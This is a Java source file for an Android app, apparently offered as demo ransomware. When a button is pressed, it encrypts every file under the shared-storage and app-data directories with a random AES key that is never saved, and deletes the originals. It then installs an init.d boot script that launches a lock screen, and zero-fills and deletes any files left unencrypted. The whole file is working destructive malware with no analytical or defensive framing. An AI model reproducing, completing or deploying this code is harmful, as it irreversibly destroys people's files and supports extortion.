package com.demo.ransom;

import android.app.Activity;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import java.io.*;
import java.security.SecureRandom;
import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;

public class MainActivity extends Activity {

    private static final String[] TARGETS = {
        "/sdcard/",
        "/storage/emulated/0/",
        "/data/data/",
        "/data/media/0/"
    };

    private static final String ENC_EXT = ".locked";

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        Button btn = new Button(this);
        btn.setText("START");
        btn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            byte[] key = generateKey();
                            for (String t : TARGETS) encryptDir(new File(t), key);
                            installInitd();
                            Thread.sleep(3000);
                            wipeOriginals();
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                }).start();
            }
        });
        setContentView(btn);
    }

    private byte[] generateKey() throws Exception {
        KeyGenerator kg = KeyGenerator.getInstance("AES");
        kg.init(256, new SecureRandom());
        SecretKey sk = kg.generateKey();
        return sk.getEncoded();
    }

    private void encryptDir(File dir, byte[] key) {
        if (dir == null || !dir.exists()) return;
        File[] files = dir.listFiles();
        if (files == null) return;
        for (File f : files) {
            if (f.isDirectory()) encryptDir(f, key);
            else encryptFile(f, key);
        }
    }

    private void encryptFile(File f, byte[] key) {
        try {
            if (f.getName().endsWith(ENC_EXT)) return;
            byte[] data = readAll(f);
            Cipher c = Cipher.getInstance("AES/ECB/PKCS5Padding");
            c.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(key, "AES"));
            byte[] enc = c.doFinal(data);
            writeAll(new File(f.getAbsolutePath() + ENC_EXT), enc);
            f.delete();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private byte[] readAll(File f) throws IOException {
        FileInputStream fis = new FileInputStream(f);
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        byte[] buf = new byte[8192];
        int n;
        while ((n = fis.read(buf)) != -1) bos.write(buf, 0, n);
        fis.close();
        return bos.toByteArray();
    }

    private void writeAll(File f, byte[] d) throws IOException {
        FileOutputStream fos = new FileOutputStream(f);
        fos.write(d);
        fos.flush();
        fos.close();
    }

    private void installInitd() {
        try {
            String script = "#!/system/bin/sh\nam start -n com.demo.ransom/.LockActivity\n";
            File out = new File("/system/etc/init.d/99ransom");
            FileOutputStream fos = new FileOutputStream(out);
            fos.write(script.getBytes());
            fos.flush();
            fos.close();
            Runtime.getRuntime().exec("chmod 755 /system/etc/init.d/99ransom");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void wipeOriginals() {
        for (String t : TARGETS) wipeDir(new File(t));
    }

    private void wipeDir(File dir) {
        if (dir == null || !dir.exists()) return;
        File[] files = dir.listFiles();
        if (files == null) return;
        for (File f : files) {
            if (f.isDirectory()) wipeDir(f);
            else if (!f.getName().endsWith(ENC_EXT)) {
                try {
                    FileOutputStream fos = new FileOutputStream(f);
                    fos.write(new byte[(int) f.length()]);
                    fos.flush();
                    fos.close();
                    f.delete();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
    }
}
